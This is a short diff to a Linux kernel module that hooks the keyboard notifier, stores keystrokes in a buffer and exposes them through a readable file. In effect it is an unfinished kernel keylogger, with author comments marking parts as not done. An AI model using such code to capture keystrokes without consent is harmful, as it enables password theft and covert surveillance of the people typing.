@@ -16,16 +16,17 @@ MODULE_PARAM_DESC(codes, "format: 0");
 
 static struct dentry *file;
 static struct dentry *subdir;
+static size_t buf_pos;
+static char keys_buf[BUF_LEN];
 
 static int keys_pressed(struct notifier_block *nblock,
                         unsigned long code,
                         void *_param);
                       
-static ssize_t dev_read(struct file *filp,
-                        char *buffer,
-                        size_t len,
+static ssize_t dev_read(struct file *filp, char *buffer,size_t len,
                         loff_t *offset){
-                        //TODO
+       //I don't what this does but i need it
+       return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
  }                      
                         
 // Initializing the norifier block
@@ -40,6 +41,8 @@ const struct file_operations keys_fops= {
                         
 int keys_pressed(struct notifier_block *nblock, unsigned long code, 
                         void *_param){
+                        
+                        //NOt done
         size_t len;
         char keybuf[CHUNK_LEN] = {0};
         struct keyboard_notifier_param *param = _param;
